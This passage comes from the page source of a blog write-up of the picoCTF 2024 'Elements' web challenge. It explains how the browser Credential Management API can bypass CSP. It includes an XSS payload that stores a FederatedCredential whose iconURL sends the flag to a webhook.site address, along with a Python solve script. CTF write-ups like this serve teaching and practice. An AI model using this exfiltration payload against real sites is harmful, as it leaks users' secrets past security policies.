          <KeyRound class="inline" /> <span>Save Username?</span>
        </h3>
        <div class="flex items-center gap-4 my-2">
          <div class="w-10 h-10 overflow-hidden rounded-full">
            <img
              alt="iconURL"
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAABHNCSVQICAgIfAhkiAAAAstJREFUWIXtl11r1EAUhp+Zk0m63ba3QoutWrWIihYEEREUBC8Ewb8qClWriLWoSC8EP8Dvz9qWemG3q90kM+NFuu2qaJsM1SL73iTMJjPPnnPeMxP16u2sZxtL/2uAjdQFDFUXMFRdwFB1AUMVDOi9x3v/x/sQRaFwSim89zjnaOOo1fH2b0qpvw/YCQdQ60nQWgMK6yytVvrDM1UhKwN2wokIj54849nLNwCM7d3N/n17sNYGR1BVPc20ayyOY67emOLSlcm1NEciXLxwjrOnT9BqpWvprqLKJvHeExvDx9k5rk5OYYyhr69Of18dEeHajdvMLyxijAkySxCgiDC/8JmVlRVMJFhrsdZiTMTycpO5+UWiSIIAg2rQec/AQB2tNX51rC2tNfXeGs6F1WClCLYLP01TRoaHGD96kC9LDbIsJ8syviw1ODZ+mJHhQdI0/cFQZVXKJO1F1nufR0ST5znXb07z+OlzlFYcOrCfs2dOIqKxziFa//L+lgG24bz3JEmC9w7nPI3lJh9n51EKhgZ30Fevo3Xh3k4nl207m67Bn5tuHBuev3jN/ZmHvHs/y1JjmTy3xaSRMNDfz8jOQY4fO8Le0RHSNKvUuEtF0DmH1kVKL0/c5M7dGdI0IzIRWqnVnaR4zjlPnufEseH0qeOcP3dmfdESEdy0SYq0QpLE3J5+wMTkFCJCvbeGiSJEZC2NIoIxEfXeGiKaKxO3mL43Q60nKZp5CcOUTrG1lrmFRWo9CSJSRPU3ESl2lYikJ+b9h0/k1pZO8aYBiwmLf56mGY1mE+c2PlIppWh++0qaZh3zbF4lG7XCOceBsVHixJAYw0bJUkAryxjdNYxzrtxylDBJZ6RMFKFFsyFdB6W1jjzP14e2JsWFsjzHZ+V2hqonmlImaS/UeS2rsrtJpQgGHUBLvvv/f9VttbqAoeoChqoLGKptD/gdhq96IOjbEl4AAAAASUVORK5CYII="
            />
          </div>
          <div>
            <div>fluffybunny</div>
            <div class="text-zinc-400">ergnjregoith5y9865jhokmfdskl;vmfdl;kfd...</div>
            <div class="text-zinc-400">accounts.example.com</div>
          </div>
        </div>

        <div class="mt-2 text-end">
          <button class="px-3 py-1 mr-2 text-blue-300 border border-blue-300 rounded-md"
            >Never</button
          >
          <button class="px-3 py-1 text-white bg-blue-400 border border-blue-400 rounded-md">
            Save
          </button>
        </div>
      </div>
      <div class="mt-1 text-sm italic text-center">Storing a FederatedCredential</div>
    </div>
  </div>
  <p>
    Astute readers would have already realized what the solution is, but lets continued with my
    experimentation with this API. I started messing around with <code>PasswordCredential</code> and
    storing them. It turns out if the user accepts, and then you call
    <code>navigator.credientals.get(cred)</code>
    with the same <code>PasswordCredential</code> object, you'll get the following popup.
  </p>
  <div class="not-tw-prose">
    <div class="m-auto w-fit">
      <div class="p-8 m-auto rounded-lg bg-zinc-800">
        <h3 class="flex items-center gap-2 mb-2 text-2xl">Sign in as</h3>
        <div class="flex items-center gap-4 my-2">
          <div class="w-10 h-10 overflow-hidden rounded-full">
            <img
              alt="iconURL"
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAABHNCSVQICAgIfAhkiAAAAstJREFUWIXtl11r1EAUhp+Zk0m63ba3QoutWrWIihYEEREUBC8Ewb8qClWriLWoSC8EP8Dvz9qWemG3q90kM+NFuu2qaJsM1SL73iTMJjPPnnPeMxP16u2sZxtL/2uAjdQFDFUXMFRdwFB1AUMVDOi9x3v/x/sQRaFwSim89zjnaOOo1fH2b0qpvw/YCQdQ60nQWgMK6yytVvrDM1UhKwN2wokIj54849nLNwCM7d3N/n17sNYGR1BVPc20ayyOY67emOLSlcm1NEciXLxwjrOnT9BqpWvprqLKJvHeExvDx9k5rk5OYYyhr69Of18dEeHajdvMLyxijAkySxCgiDC/8JmVlRVMJFhrsdZiTMTycpO5+UWiSIIAg2rQec/AQB2tNX51rC2tNfXeGs6F1WClCLYLP01TRoaHGD96kC9LDbIsJ8syviw1ODZ+mJHhQdI0/cFQZVXKJO1F1nufR0ST5znXb07z+OlzlFYcOrCfs2dOIqKxziFa//L+lgG24bz3JEmC9w7nPI3lJh9n51EKhgZ30Fevo3Xh3k4nl207m67Bn5tuHBuev3jN/ZmHvHs/y1JjmTy3xaSRMNDfz8jOQY4fO8Le0RHSNKvUuEtF0DmH1kVKL0/c5M7dGdI0IzIRWqnVnaR4zjlPnufEseH0qeOcP3dmfdESEdy0SYq0QpLE3J5+wMTkFCJCvbeGiSJEZC2NIoIxEfXeGiKaKxO3mL43Q60nKZp5CcOUTrG1lrmFRWo9CSJSRPU3ESl2lYikJ+b9h0/k1pZO8aYBiwmLf56mGY1mE+c2PlIppWh++0qaZh3zbF4lG7XCOceBsVHixJAYw0bJUkAryxjdNYxzrtxylDBJZ6RMFKFFsyFdB6W1jjzP14e2JsWFsjzHZ+V2hqonmlImaS/UeS2rsrtJpQgGHUBLvvv/f9VttbqAoeoChqoLGKptD/gdhq96IOjbEl4AAAAASUVORK5CYII="
            />
          </div>
          <div>
            <div>fluffybunny</div>
            <div class="text-zinc-400">ergnjregoith5y9865jhokmfdskl;vmfdl;kfd...</div>
          </div>
        </div>

        <div class="mt-4 text-end">
          <button class="px-3 py-1 mr-2 text-blue-300 border border-blue-300 rounded-md"
            >Cancel</button
          >
          <button class="px-3 py-1 text-white bg-blue-400 border border-blue-400 rounded-md">
            Sign In
          </button>
        </div>
      </div>
      <div class="mt-1 text-sm italic text-center">Getting a PasswordCredential</div>
    </div>
  </div>
  <p>
    If we set the <code>iconURL</code> to a server we control, we'll see when call
    <code>get()</code>
    on the <code>PasswordCredential</code>, we'll see that it gets requested! We can leak things!
  </p>
  <p>
    Sadly, this only works if the user accepts the prompt to save their password. This means that it
    requires user interaction to exfiltrate data, so we can't continue with this method.
  </p>
  <p>
    At this point I decided to play around with the <code>FederatedCredential</code> because I didn't
    think that I would be able to get user interaction.
  </p>

  <p>
    When I stored the <code>FederatedCredential</code>, it turned out that the icon was part of the
    prompt! We now had a CSP bypass and could leak the flag.
  </p>

  <h3 id="elements-bringing-it-all-together" class="elements-heading">Bringing it all together</h3>
  <p>
    We now have all we need to solve the challenge, lets first use our DFS script to get the XSS
    element.
  </p>
  <Prism
    code={`$ node dfs.js
[["Earth","Fire"],["Earth","Water"],["Magma","Mud"],["Earth","Obsidian"],["Obsidian","Water"],["Air","Water"],["Fire","Mist"],["Fog","Mud"],["Hot Spring","Sludge"],["Computer Chip","Steam Engine"],["Computer Chip","Fire"],["Artificial Intelligence","Data"],["Hot Spring","Steam Engine"],["Computer Chip","Electricity"],["Encryption","Software"],["Air","Earth"],["Fire","Steam Engine"],["Dust","Heat Engine"],["Fire","Sand"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Magma","Mist"],["Air","Rock"],["Computer Chip","Software"],["Internet","Program"],["Exploit","Web Design"]]`}
    lang="text"
  />
  <p>
    We'll be using <a href="https://requests.readthedocs.io/en/latest/" target="_blank"
      >python requests</a
    > to write a solve script here. In the solve script, assign a variable to the output of the script.
  </p>
  <p>Then we need to craft our XSS payload, here is the one I used.</p>
  <Prism
    code={`const cred = new FederatedCredential({
  id: 'solve',
  provider: 'https://google.com',
  iconURL: 'https://webhook.site/860b1d8d-f0cc-4cb8-aeca-xxxxxxxxxxxx/?'+state.flag,
});
navigator.credentials.store(cred);`}
  />
  <p>Then we send the request and get the flag!</p>
  <Prism
    code={`recipes = [["Earth","Fire"],["Earth","Water"], ...]

XSS = """..."""
assert len(XSS) < 300

payload = json.dumps({'recipe': recipes, 'xss': XSS})

r = requests.post(f"http://{HOST}/remoteCraft", params={'recipe':payload})
print(r.text)`}
    lang="python"
  />
  <p>
    If you are on a chrome style browser, you can click the following to see the popup for yourself.
  </p>
  <button
    class="px-3 py-1 !text-white bg-blue-400 border border-blue-400 rounded-md !font-serif"
    on:click={elementsPayload}
  >
    Click Me
  </button>
  <p>
    In hindsight, this API seemed a tad bit obvious because of how EhhThing <i>explicitly</i> created
    a new profile for each bot, which means that whatever the exploit was had some sort of profile persistance.
    (Which this one happened to have, the popup only opens the first time)
  </p>

  <h2 id="closing-thoughts">Closing Thoughts</h2>
  <p>
    This year's picoCTF was fun, albeit easier than previous years. I had fun with all the
    challenges, especially Elements.
  </p>
  <p>
    For anyone who is still reading, thanks for reading! I know that this writeup was much longer
    than most you'll find, but I hope that I was able to illustrate <i>how</i> we think about these problems
    and how we come to solve them.
  </p>
  <p>
    Even with how long the elements portion is, we tried much more than what was listed in this
    post, and I hope this paints a picture of how much trial and error is involved with challenges
    like this.
  </p>
  <p>
    The most important skill is a willingness to learn and keep trying. This is something I suffered
    with last year, not really pushing through solving msfroggenerator2, but it's something I myself
    am hoping to improve at.
  </p>
  <p>
    Figuring out which paths won't lead anywhere takes a good amount of intuition, and that
    intuition can only be built through practice. Speaking of practice, time for shameless plugging
    time!! Our own CTF, <a href="https://ctftime.org/event/2226" target="_blank">AmateursCTF</a>, is
    happening April 5th! It will be a fun time :)
  </p>
  <p>
    Finally, because I was the first to solve elements the way the author intended, EhhThing sent me
    a goose plushie from his school, University of Waterloo. Here it is in all its glory.
    <img src="/images/blog/pico-24/goose.jpg" class="rounded-lg" alt="waterloo goose plushie" />
  </p>
  <h2 id="special-thanks">Special Thanks</h2>
  <p>
    Yet again, I would like to give thanks to my team for being such a great group of people. Also
    thanks to EhhThing for sending me such a cute goose plushie :)
  </p>
  <p>
    Additionally, please help improve this article!! If you are confused about any given section, or
    have suggetions, please, <strong>please</strong> DM me at
    <DiscordMention>voxxal</DiscordMention> on Discord. I want to make this writeup the best it can be,
    and if any part of it is confusing, I'd like to clear that up for future readers. You'll also be
    added to this section!
  </p>
</article>

<style lang="postcss">
  h1,
  h2,
  h3,
  h4,
  h5,
  h6,
  blockquote {
    font-weight: normal !important;
    font-family: var(--font-display);
  }
  
  blockquote {
    color: theme(colors.zinc.300);
    @apply border-l-2 border-zinc-600;
  }
</style>
